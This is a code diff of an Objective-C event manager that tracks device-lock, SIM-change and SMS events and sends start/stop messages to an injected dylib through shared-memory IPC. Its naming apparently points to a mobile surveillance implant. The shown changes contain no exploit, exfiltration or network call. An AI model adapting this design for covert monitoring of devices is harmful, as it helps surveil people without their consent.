@@ -86,8 +86,6 @@ typedef struct _batteryLevel {
   u_int maxLevel;
 } batteryLevelStruct;
 
-extern RCSISharedMemory *mSharedMemoryCommand;
-
 NSLock *connectionLock;
 
 @implementation RCSIEventManager : NSObject
@@ -376,39 +374,6 @@ NSLock *connectionLock;
   [scrsvr release];
 }
 
-- (void)startEventStandBy: (int)theEventPos
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  NSMutableData *standByCommand = [[NSMutableData alloc] initWithLength:sizeof(shMemoryCommand)];
-  
-  standByStruct tmpStruct;
-  
-  shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[standByCommand bytes];
-  shMemoryHeader->agentID         = OFFT_STANDBY;
-  shMemoryHeader->direction       = D_TO_AGENT;
-  shMemoryHeader->command         = AG_START;
-  shMemoryHeader->commandDataSize = sizeof(standByStruct);
-  
-  tmpStruct.actionOnLock = theEventPos;
-  tmpStruct.actionOnUnlock = theEventPos;
-  
-  memcpy(shMemoryHeader->commandData, &tmpStruct, sizeof(tmpStruct));
-  
-  if ([mSharedMemoryCommand writeMemory: standByCommand
-                                 offset: OFFT_STANDBY
-                          fromComponent: COMP_CORE])
-    {
-#ifdef DEBUG
-      NSLog(@"%s: sending standby command to dylib: done!", __FUNCTION__);
-#endif
-    }
-  
-  [standByCommand release]; 
-  
-  [outerPool release];
-}
-
 - (void)addEventSimChangeInstance:(NSMutableDictionary*)theEvent
 {
   RCSIEventSimChange *sim = [[RCSIEventSimChange alloc] init];
@@ -471,6 +436,20 @@ typedef struct _coreMessage_t
   return TRUE;
 }
 
+- (void)setStandyProperties:(int)aProp
+{
+  for (int i=0; i<[eventsList count]; i++) 
+    {
+      NSMutableDictionary *event = [eventsList objectAtIndex:i];
+    
+      if (EVENT_STANDBY == [[event objectForKey: @"type"] intValue])
+        {
+          RCSIEventScreensaver *scr = [event objectForKey: @"object"];
+          [scr setIsDeviceLocked:aProp];
+        }
+    }
+}
+
 - (BOOL)processEvent:(NSData *)aData
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -489,17 +468,7 @@ typedef struct _coreMessage_t
     } 
     case EVENT_STANDBY:
     {
-      int eventID = anEvent->flag;
-         
-      NSMutableDictionary *theEvent = [eventsList objectAtIndex: eventID];
-        
-      id eventInst = [theEvent objectForKey: @"object"];
-        
-      if (eventInst != nil && [eventInst respondsToSelector:@selector(setStandByTimer)])
-        {
-          [eventInst performSelector:@selector(setStandByTimer)];
-          [theEvent setObject:EVENT_START forKey:@"status"];
-        }
+      [self setStandyProperties:anEvent->flag];
       break;
     }
     case EVENT_SIM_CHANGE:
@@ -610,6 +579,84 @@ typedef struct _coreMessage_t
   [pool release];
 }
 
+- (void)startRemoteEvent:(u_int)eventID
+{
+  RCSIDylibBlob *tmpBlob 
+  = [[RCSIDylibBlob alloc] initWithType:eventID 
+                                 status:1 
+                             attributes:DYLIB_EVENT_START_ATTRIB 
+                                   blob:nil
+                               configId:[[RCSIConfManager sharedInstance] mConfigTimestamp]];
+  
+  [[RCSISharedMemory sharedInstance] putBlob: tmpBlob];
+  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+  
+  [tmpBlob release];
+}
+
+- (void)stopRemoteEvent:(u_int)eventID
+{
+  RCSIDylibBlob *tmpBlob 
+  = [[RCSIDylibBlob alloc] initWithType:eventID 
+                                 status:1 
+                             attributes:DYLIB_EVENT_STOP_ATTRIB 
+                                   blob:nil
+                               configId:[[RCSIConfManager sharedInstance] mConfigTimestamp]];
+  
+  [[RCSISharedMemory sharedInstance] putBlob: tmpBlob];
+  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+  
+  [tmpBlob release];
+}
+
+- (void)startRemoteEvents
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  for (int i=0; i < [eventsList count]; i++) 
+    {
+      NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
+    
+      RCSIEvent *eventInst = [theEvent objectForKey: @"object"];
+    
+      if (eventInst != nil)
+        {
+          switch ([eventInst eventType]) 
+          {
+            case EVENT_STANDBY:
+                [self startRemoteEvent:[eventInst eventType]];
+            break;      
+          }
+        }
+    }
+  
+  [pool release];
+}
+
+- (void)stopRemoteEvents
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  for (int i=0; i < [eventsList count]; i++) 
+    {
+      NSMutableDictionary *theEvent = [eventsList objectAtIndex:i];
+      
+      RCSIEvent *eventInst = [theEvent objectForKey: @"object"];
+      
+      if (eventInst != nil)
+        {
+          switch ([eventInst eventType]) 
+            {
+              case EVENT_STANDBY:
+                [self stopRemoteEvent:[eventInst eventType]];
+              break;      
+            }
+        }
+    }
+  
+  [pool release];
+}
+
 - (void)addTimersToCurrentRunLoop
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -642,6 +689,7 @@ typedef struct _coreMessage_t
                        forMode: kRunLoopEventManagerMode];
   
   [self addTimersToCurrentRunLoop];
+  [self startRemoteEvents];
   
   while (eventManagerStatus == EVENT_MANAGER_RUNNING)
     {
@@ -656,6 +704,7 @@ typedef struct _coreMessage_t
     }
 
   [self removeTimersFromCurrentRunLoop]; 
+  [self stopRemoteEvents];
   
   [eventManagerRunLoop removePort: notificationPort 
                           forMode: kRunLoopEventManagerMode];
@@ -709,13 +758,12 @@ typedef struct _coreMessage_t
           case EVENT_STANDBY:
           {
             [self addEventScreensaverInstance:theEvent];
-            [self startEventStandBy: eventPos];
             break;
           }
           case EVENT_SIM_CHANGE:
           {
             [self addEventSimChangeInstance:theEvent];
-          break;
+            break;
           }
           case EVENT_SMS:
           {
